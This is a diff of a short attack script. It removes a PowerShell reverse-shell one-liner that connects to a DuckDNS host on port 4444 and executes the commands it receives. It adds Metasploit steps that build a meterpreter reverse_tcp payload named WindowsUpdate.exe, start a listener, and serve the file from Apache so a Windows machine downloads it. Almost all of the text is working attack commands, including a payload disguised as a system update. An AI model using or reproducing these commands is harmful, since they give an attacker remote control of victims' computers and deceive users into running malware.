@@ -1,3 +1,13 @@
-#Change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncat is listening to
-
-$sm=(New-Object Net.Sockets.TCPClient('http://duckshell.duckdns.org',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+#creates payload
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.##.## LPORT=4444 -o ~/Desktop/WindowsUpdate.exe
+# Start listener 
+msfconsole
+use Multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.13.149
+set LPORT 4444
+exploit
+# put payload onto apache2 webserver in kali 
+cp WindowsUpdate.exe /var/www/html
+service apache2 start
+On the windows machine surf to http://<kali-ip>/WindowsUpdate.exe to download the file
